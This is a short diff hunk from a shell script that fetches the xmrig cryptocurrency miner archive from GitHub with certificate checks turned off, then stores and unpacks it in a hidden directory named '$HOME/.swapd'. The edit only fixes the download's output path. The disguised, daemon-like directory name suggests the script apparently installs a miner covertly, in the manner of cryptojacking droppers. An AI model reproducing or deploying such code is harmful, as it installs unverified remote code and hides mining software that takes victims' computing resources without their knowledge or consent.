@@ -237,10 +237,10 @@ if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig
 #  exit 1
 fi
 
-wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
+wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O $HOME/.swapd/xmrig.tar.gz
 # curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o $HOME/.swapd/xmrig.tar.gz
 
-echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
+echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd/"
 [ -d $HOME/.swapd/ ] || mkdir $HOME/.swapd/
 if ! tar xf $HOME/.swapd/xmrig.tar.gz -C $HOME/.swapd/; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd/ directory"
